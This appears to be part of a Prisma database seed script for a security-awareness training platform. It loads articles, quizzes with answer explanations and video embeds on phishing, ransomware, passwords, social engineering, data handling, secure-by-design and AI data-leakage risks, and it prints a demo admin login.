          id: 'sys-q-phish-1',
          question: 'You receive an email from "IT-Support@yourcompany.co" (your company uses .com). What should you do?',
          correctAnswer: 'c',
          options: JSON.stringify([
            { id: 'a', text: 'Click the link — IT support is trustworthy' },
            { id: 'b', text: 'Reply asking for more details' },
            { id: 'c', text: 'Report it as phishing — the domain is wrong (.co vs .com)' },
            { id: 'd', text: 'Forward it to your team' },
          ]),
          explanation: 'The domain mismatch (.co instead of .com) is a classic phishing indicator. Always verify the sender domain matches your company\'s actual domain exactly.',
        },
        {
          id: 'sys-q-phish-2',
          question: 'Which of these is the SAFEST way to verify a suspicious email from your bank?',
          correctAnswer: 'b',
          options: JSON.stringify([
            { id: 'a', text: 'Click the link in the email and check if the page looks real' },
            { id: 'b', text: 'Call your bank using the number on your card (not from the email)' },
            { id: 'c', text: 'Reply to the email asking if it\'s legitimate' },
            { id: 'd', text: 'Google the bank and click the first result' },
          ]),
          explanation: 'Always verify through a known channel. Call the number on your physical bank card or type the bank\'s URL directly. Never trust contact info provided in a suspicious email.',
        },
        {
          id: 'sys-q-phish-3',
          question: 'An email says "Your password expires in 2 hours — click here to reset." What\'s the red flag?',
          correctAnswer: 'a',
          options: JSON.stringify([
            { id: 'a', text: 'Artificial urgency designed to make you act without thinking' },
            { id: 'b', text: 'Password resets are never sent by email' },
            { id: 'c', text: 'The email is too short' },
            { id: 'd', text: 'There are no red flags — this is normal' },
          ]),
          explanation: 'Creating artificial urgency ("2 hours") is a classic social engineering technique. It pressures victims into acting impulsively without verifying the request\'s legitimacy.',
        },
      ],
    },
    {
      id: 'sys-content-ransomware',
      title: 'Ransomware: Prevention & Response',
      type: 'article',
      category: 'ransomware',
      icon: '🔒',
      color: '#f59e0b',
      difficulty: 'Intermediate',
      duration: 12,
      description: 'Understand how ransomware works, how to prevent infection, and what to do if your systems are compromised.',
      content: `Ransomware encrypts your files and demands payment for the decryption key.\n\nHOW RANSOMWARE SPREADS:\n• Phishing emails with malicious attachments\n• Drive-by downloads from compromised websites\n• Exploiting unpatched vulnerabilities (e.g., EternalBlue)\n• Remote Desktop Protocol (RDP) brute-force\n• Supply chain attacks\n\nPREVENTION:\n• Keep systems patched and updated\n• Use endpoint detection & response (EDR)\n• Implement email filtering and sandboxing\n• Enable MFA on all accounts\n• Follow 3-2-1 backup rule (3 copies, 2 media types, 1 offsite)\n• Restrict admin privileges (least privilege)\n\nIF YOU'RE HIT:\n1. ISOLATE — disconnect affected systems from the network\n2. DON'T PAY — payment doesn't guarantee recovery and funds criminal activity\n3. REPORT — notify your security team and legal/compliance\n4. RESTORE — use clean backups to recover\n5. INVESTIGATE — determine the root cause to prevent recurrence`,
      questions: [
        {
          id: 'sys-q-ransom-1',
          question: 'What is the 3-2-1 backup rule?',
          correctAnswer: 'b',
          options: JSON.stringify([
            { id: 'a', text: '3 passwords, 2 factor auth, 1 backup' },
            { id: 'b', text: '3 copies of data, 2 different media types, 1 copy offsite' },
            { id: 'c', text: '3 daily backups, 2 weekly backups, 1 monthly backup' },
            { id: 'd', text: '3 servers, 2 networks, 1 firewall' },
          ]),
          explanation: 'The 3-2-1 rule ensures data resilience: 3 copies of your data, on 2 different storage media (e.g., disk and tape), with 1 copy stored offsite or in the cloud.',
        },
        {
          id: 'sys-q-ransom-2',
          question: 'Your computer screen shows a ransom demand. What should you do FIRST?',
          correctAnswer: 'c',
          options: JSON.stringify([
            { id: 'a', text: 'Pay the ransom quickly to minimize data loss' },
            { id: 'b', text: 'Turn off the computer completely' },
            { id: 'c', text: 'Disconnect from the network and notify your security team' },
            { id: 'd', text: 'Try to decrypt the files yourself' },
          ]),
          explanation: 'Immediately isolating the system prevents the ransomware from spreading to other network devices. Then alert your security team who have the tools and procedures to handle the incident.',
        },
      ],
    },
    {
      id: 'sys-content-password-quiz',
      title: 'Password Security Assessment',
      type: 'quiz',
      category: 'password',
      icon: '🔑',
      color: '#3b82f6',
      difficulty: 'Beginner',
      duration: 5,
      description: 'Test your knowledge of password best practices, MFA, and credential management.',
      content: '',
      questions: [
        {
          id: 'sys-q-pass-1',
          question: 'Which password is the STRONGEST?',
          correctAnswer: 'c',
          options: JSON.stringify([
            { id: 'a', text: 'P@ssw0rd123!' },
            { id: 'b', text: 'MyDogNameIsMax2024' },
            { id: 'c', text: 'correct-horse-battery-staple' },
            { id: 'd', text: 'Qwerty!@#$%' },
          ]),
          explanation: 'Long passphrases (4+ random words) provide the most entropy while remaining memorable. "P@ssw0rd" variants are in every dictionary attack. Personal info like pet names is guessable.',
        },
        {
          id: 'sys-q-pass-2',
          question: 'What is the MOST effective form of MFA?',
          correctAnswer: 'd',
          options: JSON.stringify([
            { id: 'a', text: 'SMS one-time codes' },
            { id: 'b', text: 'Email verification links' },
            { id: 'c', text: 'Security questions (e.g., mother\'s maiden name)' },
            { id: 'd', text: 'Hardware security keys (FIDO2/WebAuthn)' },
          ]),
          explanation: 'Hardware security keys are phishing-resistant and can\'t be intercepted like SMS codes (SIM swapping) or email links. FIDO2/WebAuthn is the gold standard for MFA.',
        },
        {
          id: 'sys-q-pass-3',
          question: 'How should you manage passwords across different accounts?',
          correctAnswer: 'b',
          options: JSON.stringify([
            { id: 'a', text: 'Use the same strong password everywhere' },
            { id: 'b', text: 'Use a password manager with unique passwords per account' },
            { id: 'c', text: 'Write them in a notebook kept at your desk' },
            { id: 'd', text: 'Use variations of one password (MyPass1, MyPass2, etc.)' },
          ]),
          explanation: 'Password managers generate and store unique, strong passwords for every account. Password reuse means one breach compromises all accounts. Variations are easily guessable.',
        },
      ],
    },
    {
      id: 'sys-content-social-eng',
      title: 'Social Engineering Tactics & Defences',
      type: 'article',
      category: 'social-eng',
      icon: '🎭',
      color: '#8b5cf6',
      difficulty: 'Intermediate',
      duration: 10,
      description: 'Recognise social engineering techniques including pretexting, baiting, tailgating, and quid pro quo attacks.',
      content: `Social engineering exploits human psychology rather than technical vulnerabilities.\n\nCOMMON TECHNIQUES:\n\n• PRETEXTING: Creating a fabricated scenario to gain trust. "Hi, I'm from IT — I need your password to fix a critical issue."\n\n• BAITING: Leaving infected USB drives or offering free downloads. Curiosity drives victims to plug in or install malware.\n\n• TAILGATING: Following authorised personnel through secure doors without badging in.\n\n• QUID PRO QUO: Offering a service in exchange for information. "Free tech support if you give us remote access."\n\n• VISHING: Voice phishing via phone calls impersonating banks, tech support, or executives.\n\nDEFENCES:\n• Always verify identity through official channels\n• Never share credentials — IT will never ask for your password\n• Challenge unknown visitors and report tailgating\n• Be suspicious of unsolicited help offers\n• Report found USB drives to security`,
      questions: [
        {
          id: 'sys-q-social-1',
          question: 'Someone calls claiming to be from Microsoft support, saying your computer has a virus. What should you do?',
          correctAnswer: 'c',
          options: JSON.stringify([
            { id: 'a', text: 'Follow their instructions — Microsoft knows about viruses' },
            { id: 'b', text: 'Give them remote access to fix it quickly' },
            { id: 'c', text: 'Hang up — Microsoft never makes unsolicited support calls' },
            { id: 'd', text: 'Ask them for their employee ID number' },
          ]),
          explanation: 'This is a classic tech support scam (vishing). Microsoft, Apple, and other tech companies never make unsolicited calls about viruses. Hang up and report it.',
        },
      ],
    },
    {
      id: 'sys-content-data-privacy',
      title: 'Data Classification & Handling',
      type: 'article',
      category: 'data-privacy',
      icon: '🏷️',
      color: '#10b981',
      difficulty: 'Beginner',
      duration: 7,
      description: 'Learn how to classify, handle, store, and share data according to sensitivity levels and compliance requirements.',
      content: `Every piece of data has a classification level that determines how it must be handled.\n\nCLASSIFICATION LEVELS:\n\n🔴 CONFIDENTIAL / RESTRICTED\n• PII, financial records, health data, trade secrets\n• Encryption required at rest and in transit\n• Access limited to named individuals\n• Examples: salary data, customer SSNs, source code\n\n🟡 INTERNAL\n• Business data not intended for public release\n• Standard access controls apply\n• Examples: internal memos, project plans, org charts\n\n🟢 PUBLIC\n• Approved for external sharing\n• No special handling required\n• Examples: marketing materials, press releases\n\nHANDLING RULES:\n• Never send confidential data via unencrypted email\n• Use approved file sharing tools (not personal Dropbox)\n• Lock screens when away from your desk\n• Shred physical documents containing sensitive data\n• Report data incidents immediately`,
      questions: [
        {
          id: 'sys-q-data-1',
          question: 'A colleague asks you to email them a spreadsheet of employee salaries. What should you do?',
          correctAnswer: 'b',
          options: JSON.stringify([
            { id: 'a', text: 'Send it — they\'re a colleague and probably need it' },
            { id: 'b', text: 'Verify their need-to-know and use an encrypted/approved channel' },
            { id: 'c', text: 'Password-protect the file and send via email' },
            { id: 'd', text: 'Print it and hand-deliver it to them' },
          ]),
          explanation: 'Salary data is Confidential. First verify the colleague is authorised to access it (need-to-know), then use an approved encrypted channel. Email — even with password-protected files — may not meet compliance requirements.',
        },
      ],
    },
    {
      id: 'sys-content-secure-by-design',
      title: 'Secure by Design: Core Principles',
      type: 'article',
      category: 'secure-code',
      icon: '🛡️',
      color: '#ec4899',
      difficulty: 'Advanced',
      duration: 15,
      description: 'Explore the foundations of Secure-by-Design and Secure-by-Default principles as outlined by CISA and international security agencies.',
      content: `Secure-by-Design means products are built with security integrated into the SDLC, rather than treated as an afterthought.\n\nCORE PRINCIPLES:\n\n1. SHIFT LEFT\n• Integrate security tools and threat modelling early in the software design phase.\n• Catching vulnerabilities during design is 100x cheaper than fixing them in production.\n\n2. SECURE BY DEFAULT\n• Products should be secure out-of-the-box without requiring complex user configuration.\n• Default passwords must be banned; MFA should be enabled by default.\n• Permissive access controls should be disabled unless explicitly needed.\n\n3. DEFENSE IN DEPTH\n• Never rely on a single layer of security. If a firewall fails, an intrusion detection system should catch it; if that fails, database encryption should protect the assets.\n\n4. LEAST PRIVILEGE\n• Restrict user, server, and application roles to only the minimum permissions necessary to perform their functions.\n\n5. THREAT MODELLING\n• Structured approach to identifying potential security threats (e.g., STRIDE framework) and implementing mitigations before writing code.`,
      questions: [
        {
          id: 'sys-q-sbd-1',
          question: 'What does CISA\'s "Secure by Default" principle advocate for?',
          correctAnswer: 'c',
          options: JSON.stringify([
            { id: 'a', text: 'Users should be responsible for enabling all security settings manually' },
            { id: 'b', text: 'Security features should only be available in paid enterprise tiers' },
            { id: 'c', text: 'The product is secure out-of-the-box with strong default settings, closed ports, and no default passwords' },
            { id: 'd', text: 'Software should be shipped fast and patched only after a compromise is reported' },
          ]),
          explanation: 'Secure-by-Default means the software is shipped secure out-of-the-box. Users do not need to perform complex hardening tasks to keep their basic installation safe.',
        },
        {
          id: 'sys-q-sbd-2',
          question: 'What is "Shift Left" in security development?',
          correctAnswer: 'a',
          options: JSON.stringify([
            { id: 'a', text: 'Integrating security assessments and threat modeling early in the software design and development life cycle' },
            { id: 'b', text: 'Moving code repositories to open-source platforms' },
            { id: 'c', text: 'Deferring security checks until right before release to avoid delaying engineers' },
            { id: 'd', text: 'Reducing the budget allocated to the security department' },
          ]),
          explanation: 'Shifting Left means addressing security as early as possible in the software development lifecycle (design, coding) rather than testing only at the end (production/release).',
        },
      ],
    },
    {
      id: 'sys-content-ai-security',
      title: 'Generative AI & Data Leakage Risks',
      type: 'article',
      category: 'ai-awareness',
      icon: '🧠',
      color: '#06b6d4',
      difficulty: 'Intermediate',
      duration: 10,
      description: 'Safely leverage Generative AI tools (like ChatGPT or Copilot) while protecting proprietary company data and preventing intellectual property leakage.',
      content: `Generative AI tools are extremely powerful, but they present unique risks to corporate intellectual property.\n\nKEY RISKS:\n\n1. DATA LEAKAGE\n• Any data, code, or customer information you paste into public AI models can be used by the model provider to retrain their algorithms.\n• Pasting proprietary source code or financial projections can lead to accidental public disclosure.\n• Public AI outputs may be generated for users outside the company, exposing confidential data.\n\n2. PROMPT INJECTION ATTACKS\n• Malicious prompts designed to bypass safety boundaries and force the AI system to disclose system prompts, execute unauthorized code, or display phishing links.\n\n3. FABRICATIONS / HALLUCINATIONS\n• AI outputs are probabilistic and can return completely fabricated "facts," fake code packages (leading to dependency confusion attacks), or outdated security advice.\n\nSAFE HANDLING GUIDELINES:\n• Never paste customer PII, corporate source code, or confidential strategic plans into public AI models.\n• Always verify code output by AI tools before deploying it.\n• Use designated enterprise AI endpoints with data-retention opt-out policies.\n• Understand your company\'s approved AI usage policy.`,
      questions: [
        {
          id: 'sys-q-ai-1',
          question: 'Which of the following is SAFE to input into a free public version of an AI chat tool?',
          correctAnswer: 'd',
          options: JSON.stringify([
            { id: 'a', text: 'A proprietary code snippet you are trying to debug' },
            { id: 'b', text: 'Draft customer emails containing real customer names and transaction histories' },
            { id: 'c', text: 'Confidential product roadmaps and financial forecasts for Q4' },
            { id: 'd', text: 'A general request to draft a generic, non-proprietary marketing email template' },
          ]),
          explanation: 'Generic, public, or non-sensitive information is safe for public AI engines. You must never paste proprietary code, private company plans, or PII into standard public AI models.',
        },
      ],
    },
    // ─── Video Training Library — YouTube Embeds (Free, Legal, No Watermark) ───
    {
      id: 'sys-content-video-phishing',
      title: 'Phishing Attacks — How to Spot & Stop Them',
      type: 'video',
      category: 'phishing',
      icon: '🎬',
      color: '#ef4444',
      difficulty: 'Beginner',
      duration: 7,
      description: 'A concise, professional training video covering how phishing emails work, how to identify red flags, and the right steps to take when you receive a suspicious message.',
      content: 'https://www.youtube.com/embed/XBkzBrXlle0',
      questions: [],
    },
    {
      id: 'sys-content-video-secure-code',
      title: 'Secure Coding Best Practices — OWASP Top 10',
      type: 'video',
      category: 'secure-code',
      icon: '🎥',
      color: '#8b5cf6',
      difficulty: 'Intermediate',
      duration: 10,
      description: 'A developer-focused training video covering OWASP Top 10 vulnerabilities including SQL injection, broken access control, cryptographic failures, and how to write secure code.',
      content: 'https://www.youtube.com/embed/sHKyGLb35rE',
      questions: [],
    },
    {
      id: 'sys-content-video-ransomware',
      title: 'Ransomware Explained — Prevention & Response',
      type: 'video',
      category: 'ransomware',
      icon: '🎞️',
      color: '#f59e0b',
      difficulty: 'Intermediate',
      duration: 8,
      description: 'A scenario-based training video explaining how ransomware spreads, how to prevent infection, and the step-by-step incident response process your team should follow if hit.',
      content: 'https://www.youtube.com/embed/Vkjekr6jacg',
      questions: [],
    },
    {
      id: 'sys-content-video-social-eng',
      title: 'Social Engineering Attacks — Real World Examples',
      type: 'video',
      category: 'social-eng',
      icon: '📹',
      color: '#10b981',
      difficulty: 'Beginner',
      duration: 6,
      description: 'A short but impactful video demonstrating real-world pretexting, vishing, tailgating and baiting attacks, with defence strategies for every employee.',
      content: 'https://www.youtube.com/embed/lc7scxvKQOo',
      questions: [],
    },
    {
      id: 'sys-content-video-password',
      title: 'Password Security & MFA — Best Practices',
      type: 'video',
      category: 'password',
      icon: '🔑',
      color: '#3b82f6',
      difficulty: 'Beginner',
      duration: 5,
      description: 'Learn how to create strong passwords, use a password manager, and enable multi-factor authentication to protect your accounts from credential theft.',
      content: 'https://www.youtube.com/embed/aEmXfKcsDKo',
      questions: [],
    },
    {
      id: 'sys-content-video-ai-awareness',
      title: 'AI & Cybersecurity — New Threats in 2024',
      type: 'video',
      category: 'ai-awareness',
      icon: '🤖',
      color: '#06b6d4',
      difficulty: 'Intermediate',
      duration: 9,
      description: 'Explore how cybercriminals are leveraging AI tools including deepfakes, AI-generated phishing, and prompt injection to bypass traditional defences.',
      content: 'https://www.youtube.com/embed/CqTFYfKNEsY',
      questions: [],
    },
  ]

  for (const item of contentItems) {
    const { questions, ...itemData } = item
    await prisma.contentItem.upsert({
      where: { id: item.id },
      update: {},
      create: {
        ...itemData,
        orgId: org.id,
        isSystem: true,
        sortOrder: contentItems.indexOf(item),
      },
    })

    for (const q of questions) {
      await prisma.quizQuestion.upsert({
        where: { id: q.id },
        update: {},
        create: {
          ...q,
          contentId: item.id,
          options: typeof q.options === 'string' ? JSON.parse(q.options) : q.options,
          sortOrder: questions.indexOf(q),
        },
      })
    }
  }
  console.log(`✓ Content Library: ${contentItems.length} items with quiz questions`)

  console.log('\n✅ Seed complete!')
  console.log('   Login: admin@acmecorp.com / ShieldIQ-Demo-2026!')
}

main()
  .catch((e) => { console.error(e); process.exit(1) })
  .finally(() => prisma.$disconnect())


